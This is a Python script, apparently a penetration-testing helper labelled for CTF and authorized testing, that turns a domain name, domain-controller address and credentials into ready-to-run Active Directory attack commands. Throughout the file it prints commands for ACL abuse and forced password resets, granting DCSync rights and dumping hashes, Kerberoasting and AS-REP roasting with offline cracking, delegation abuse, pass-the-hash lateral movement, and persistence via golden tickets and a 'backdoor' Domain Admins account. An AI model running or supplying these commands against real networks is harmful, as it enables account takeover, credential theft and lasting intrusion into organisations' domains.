#!/usr/bin/env python3
"""
AD Exploitation Helper
Génère des commandes d'exploitation basées sur les vulnérabilités trouvées
"""

import argparse
import sys

class ExploitHelper:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
    
    def print_banner(self):
        print("""
╔═══════════════════════════════════════════════════════╗
║       AD Exploitation Command Generator               ║
║       For CTF & Authorized Testing                    ║
╚═══════════════════════════════════════════════════════╝
        """)
    
    def generic_all_exploit(self, target):
        """Exploitation de GenericAll"""
        print("\n[+] GenericAll Exploitation")
        print("="*70)
        print(f"Target: {target}")
        print("\nOptions:")
        
        print("\n1) Password Reset (Impacket):")
        print(f"   python3 changepasswd.py {self.domain}/{self.username}:'{self.password}'@{target} -newpass 'NewPass123!'")
        
        print("\n2) Password Reset (net rpc):")
        print(f'   net rpc password "{target}" "NewPass123!" -U "{self.domain}/{self.username}"%"{self.password}" -S {self.dc_ip}')
        
        print("\n3) Add to Group (if target is group):")
        print(f'   net rpc group addmem "{target}" "{self.username}" -U "{self.domain}/{self.username}"%"{self.password}" -S {self.dc_ip}')
        
        print("\n4) PowerView (PowerShell):")
        print(f"   Set-DomainUserPassword -Identity {target} -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)")
        
        print("\n5) Shadow Credentials (PKINIT):")
        print(f"   python3 pywhisker.py -d {self.domain} -u {self.username} -p '{self.password}' --target {target} --action add")
    
    def write_dacl_exploit(self, target):
        """Exploitation de WriteDacl"""
        print("\n[+] WriteDacl Exploitation")
        print("="*70)
        print(f"Target: {target}")
        print("\nSteps:")
        
        print("\n1) Grant yourself GenericAll rights:")
        print(f"   Add-DomainObjectAcl -TargetIdentity '{target}' -PrincipalIdentity '{self.username}' -Rights All")
        
        print("\n2) Then exploit as GenericAll (see above)")
        
        print("\n3) Alternative - DCSync rights (if target is domain):")
        print(f"   Add-DomainObjectAcl -TargetIdentity 'DC={self.domain.split('.')[0]},DC={self.domain.split('.')[1]}' \\")
        print(f"       -PrincipalIdentity '{self.username}' -Rights DCSync")
        print(f"\n   Then: secretsdump.py {self.domain}/{self.username}:'{self.password}'@{self.dc_ip}")
    
    def write_owner_exploit(self, target):
        """Exploitation de WriteOwner"""
        print("\n[+] WriteOwner Exploitation")
        print("="*70)
        print(f"Target: {target}")
        print("\nSteps:")
        
        print("\n1) Become owner:")
        print(f"   Set-DomainObjectOwner -Identity '{target}' -OwnerIdentity '{self.username}'")
        
        print("\n2) Grant yourself rights:")
        print(f"   Add-DomainObjectAcl -TargetIdentity '{target}' -PrincipalIdentity '{self.username}' -Rights All")
        
        print("\n3) Then exploit as GenericAll (see above)")
    
    def self_membership_exploit(self, target_group):
        """Exploitation de Self-Membership"""
        print("\n[+] Self-Membership Exploitation")
        print("="*70)
        print(f"Target Group: {target_group}")
        print("\nOptions:")
        
        print("\n1) Add yourself to group (net rpc):")
        print(f'   net rpc group addmem "{target_group}" "{self.username}" -U "{self.domain}/{self.username}"%"{self.password}" -S {self.dc_ip}')
        
        print("\n2) PowerView:")
        print(f"   Add-DomainGroupMember -Identity '{target_group}' -Members '{self.username}'")
        
        print("\n3) Verify membership:")
        print(f"   net rpc group members '{target_group}' -U '{self.domain}/{self.username}'%'{self.password}' -S {self.dc_ip}")
    
    def force_change_password_exploit(self, target):
        """Exploitation de ForceChangePassword"""
        print("\n[+] ForceChangePassword Exploitation")
        print("="*70)
        print(f"Target: {target}")
        print("\nSame as GenericAll password reset:")
        
        print(f"\n   python3 changepasswd.py {self.domain}/{self.username}:'{self.password}'@{target} -newpass 'NewPass123!'")
    
    def kerberoasting_exploit(self, spn_users):
        """Exploitation Kerberoasting"""
        print("\n[+] Kerberoasting Exploitation")
        print("="*70)
        print("SPN Users found:")
        for user in spn_users:
            print(f"  - {user}")
        
        print("\nSteps:")
        print("\n1) Request TGS tickets:")
        print(f"   GetUserSPNs.py {self.domain}/{self.username}:'{self.password}' -dc-ip {self.dc_ip} -request")
        
        print("\n2) Or save to file:")
        print(f"   GetUserSPNs.py {self.domain}/{self.username}:'{self.password}' -dc-ip {self.dc_ip} -request -outputfile kerberoast.txt")
        
        print("\n3) Crack with Hashcat:")
        print("   hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt")
        
        print("\n4) Or John:")
        print("   john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt")
    
    def asrep_roasting_exploit(self, asrep_users):
        """Exploitation AS-REP Roasting"""
        print("\n[+] AS-REP Roasting Exploitation")
        print("="*70)
        print("AS-REP Roastable users found:")
        for user in asrep_users:
            print(f"  - {user}")
        
        print("\nSteps:")
        print("\n1) Create users file:")
        print("   echo 'user1\\nuser2\\nuser3' > asrep_users.txt")
        
        print("\n2) Request AS-REP hashes:")
        print(f"   GetNPUsers.py {self.domain}/ -dc-ip {self.dc_ip} -usersfile asrep_users.txt -format hashcat")
        
        print("\n3) Or for a single user:")
        print(f"   GetNPUsers.py {self.domain}/target_user -dc-ip {self.dc_ip} -no-pass")
        
        print("\n4) Crack with Hashcat:")
        print("   hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt")
    
    def unconstrained_delegation_exploit(self, computer):
        """Exploitation Unconstrained Delegation"""
        print("\n[+] Unconstrained Delegation Exploitation")
        print("="*70)
        print(f"Computer: {computer}")
        
        print("\nSteps:")
        print("\n1) If you have admin on this computer, monitor for TGTs:")
        print("   Rubeus.exe monitor /interval:5")
        
        print("\n2) Coerce authentication from target (e.g., DC):")
        print(f"   python3 printerbug.py {self.domain}/{self.username}:'{self.password}'@DC-IP {computer}")
        
        print("\n3) Extract TGT and perform Pass-the-Ticket:")
        print("   Rubeus.exe ptt /ticket:<base64_ticket>")
        
        print("\n4) Or use Impacket:")
        print(f"   getST.py {self.domain}/{computer}$ -spn cifs/DC.{self.domain} -impersonate Administrator")
    
    def constrained_delegation_exploit(self, account, targets):
        """Exploitation Constrained Delegation"""
        print("\n[+] Constrained Delegation Exploitation")
        print("="*70)
        print(f"Account: {account}")
        print("Can delegate to:")
        for target in targets:
            print(f"  - {target}")
        
        print("\nSteps:")
        print("\n1) Request TGT for the delegated account:")
        print(f"   getTGT.py {self.domain}/{account}:'{self.password}'")
        
        print("\n2) Request Service Ticket (S4U2Self + S4U2Proxy):")
        print(f"   getST.py {self.domain}/{account} -spn {targets[0]} -impersonate Administrator -dc-ip {self.dc_ip}")
        
        print("\n3) Use the ticket:")
        print("   export KRB5CCNAME=Administrator.ccache")
        print(f"   psexec.py {self.domain}/Administrator@target -k -no-pass")
    
    def bloodhound_analysis(self):
        """Commandes BloodHound"""
        print("\n[+] BloodHound Analysis")
        print("="*70)
        
        print("\n1) Collect data:")
        print(f"   bloodhound-python -d {self.domain} -u {self.username} -p '{self.password}' -ns {self.dc_ip} -c All")
        
        print("\n2) Start Neo4j & BloodHound:")
        print("   sudo neo4j start")
        print("   bloodhound")
        
        print("\n3) Upload JSON files to BloodHound")
        
        print("\n4) Useful queries:")
        print("   - Find Shortest Path to Domain Admins")
        print("   - Find Principals with DCSync Rights")
        print("   - Find AS-REP Roastable Users")
        print("   - Find Kerberoastable Users")
        print("   - Find Computers with Unconstrained Delegation")
    
    def lateral_movement(self, target_host, target_user, target_pass):
        """Techniques de mouvement latéral"""
        print("\n[+] Lateral Movement Techniques")
        print("="*70)
        print(f"Target: {target_host}")
        
        print("\n1) PSExec:")
        print(f"   psexec.py {self.domain}/{target_user}:'{target_pass}'@{target_host}")
        
        print("\n2) WMIExec:")
        print(f"   wmiexec.py {self.domain}/{target_user}:'{target_pass}'@{target_host}")
        
        print("\n3) SMBExec:")
        print(f"   smbexec.py {self.domain}/{target_user}:'{target_pass}'@{target_host}")
        
        print("\n4) Pass-the-Hash:")
        print(f"   psexec.py {self.domain}/{target_user}@{target_host} -hashes :NTLM_HASH")
        
        print("\n5) Evil-WinRM (if WinRM enabled):")
        print(f"   evil-winrm -i {target_host} -u {target_user} -p '{target_pass}'")
        
        print("\n6) RDP:")
        print(f"   xfreerdp /u:{target_user} /p:'{target_pass}' /v:{target_host} /d:{self.domain}")
    
    def persistence_techniques(self):
        """Techniques de persistance"""
        print("\n[+] Persistence Techniques")
        print("="*70)
        
        print("\n1) Golden Ticket (requires krbtgt hash):")
        print(f"   ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain {self.domain} Administrator")
        
        print("\n2) Silver Ticket:")
        print(f"   ticketer.py -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain {self.domain} -spn cifs/target.{self.domain} Administrator")
        
        print("\n3) Add user to Domain Admins:")
        print(f"   net rpc group addmem 'Domain Admins' '{self.username}' -U '{self.domain}/{self.username}'%'{self.password}' -S {self.dc_ip}")
        
        print("\n4) Create new user:")
        print(f"   net rpc user add backdoor 'BackdoorPass123!' -U '{self.domain}/{self.username}'%'{self.password}' -S {self.dc_ip}")
        
        print("\n5) DCSync (dump all hashes):")
        print(f"   secretsdump.py {self.domain}/{self.username}:'{self.password}'@{self.dc_ip}")
    
    def generate_all_commands(self):
        """Générer toutes les commandes courantes"""
        self.print_banner()
        
        print("\n[!] Select exploitation type:")
        print("="*70)
        print("1)  GenericAll on User/Object")
        print("2)  WriteDacl on User/Object")
        print("3)  WriteOwner on User/Object")
        print("4)  Self-Membership on Group")
        print("5)  ForceChangePassword on User")
        print("6)  Kerberoasting")
        print("7)  AS-REP Roasting")
        print("8)  Unconstrained Delegation")
        print("9)  Constrained Delegation")
        print("10) BloodHound Analysis")
        print("11) Lateral Movement")
        print("12) Persistence Techniques")
        print("13) All Commands (print everything)")
        print("="*70)
        
        choice = input("\nEnter choice (1-13): ").strip()
        
        if choice == '1':
            target = input("Target user/object: ").strip()
            self.generic_all_exploit(target)
        elif choice == '2':
            target = input("Target user/object: ").strip()
            self.write_dacl_exploit(target)
        elif choice == '3':
            target = input("Target user/object: ").strip()
            self.write_owner_exploit(target)
        elif choice == '4':
            target = input("Target group: ").strip()
            self.self_membership_exploit(target)
        elif choice == '5':
            target = input("Target user: ").strip()
            self.force_change_password_exploit(target)
        elif choice == '6':
            users = input("SPN users (comma-separated): ").strip().split(',')
            self.kerberoasting_exploit([u.strip() for u in users])
        elif choice == '7':
            users = input("AS-REP users (comma-separated): ").strip().split(',')
            self.asrep_roasting_exploit([u.strip() for u in users])
        elif choice == '8':
            computer = input("Computer with unconstrained delegation: ").strip()
            self.unconstrained_delegation_exploit(computer)
        elif choice == '9':
            account = input("Account with delegation: ").strip()
            targets = input("Target SPNs (comma-separated): ").strip().split(',')
            self.constrained_delegation_exploit(account, [t.strip() for t in targets])
        elif choice == '10':
            self.bloodhound_analysis()
        elif choice == '11':
            host = input("Target host: ").strip()
            user = input("Target user: ").strip()
            pwd = input("Target password: ").strip()
            self.lateral_movement(host, user, pwd)
        elif choice == '12':
            self.persistence_techniques()
        elif choice == '13':
            self.print_all()
        else:
            print("Invalid choice")
    
    def print_all(self):
        """Imprimer toutes les techniques"""
        self.generic_all_exploit("TARGET_USER")
        self.write_dacl_exploit("TARGET_USER")
        self.write_owner_exploit("TARGET_USER")
        self.self_membership_exploit("TARGET_GROUP")
        self.force_change_password_exploit("TARGET_USER")
        self.kerberoasting_exploit(["user1", "user2"])
        self.asrep_roasting_exploit(["user1", "user2"])
        self.unconstrained_delegation_exploit("COMPUTER$")
        self.constrained_delegation_exploit("ACCOUNT", ["cifs/target.domain"])
        self.bloodhound_analysis()
        self.lateral_movement("TARGET_HOST", "user", "pass")
        self.persistence_techniques()

def main():
    parser = argparse.ArgumentParser(
        description='AD Exploitation Command Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-d', '--domain', required=True, help='Domain name')
    parser.add_argument('-dc', '--dc-ip', required=True, help='Domain Controller IP')
    parser.add_argument('-u', '--username', required=True, help='Your username')
    parser.add_argument('-p', '--password', required=True, help='Your password')
    
    args = parser.parse_args()
    
    helper = ExploitHelper(
        domain=args.domain,
        dc_ip=args.dc_ip,
        username=args.username,
        password=args.password
    )
    
    helper.generate_all_commands()

if __name__ == '__main__':
    main()
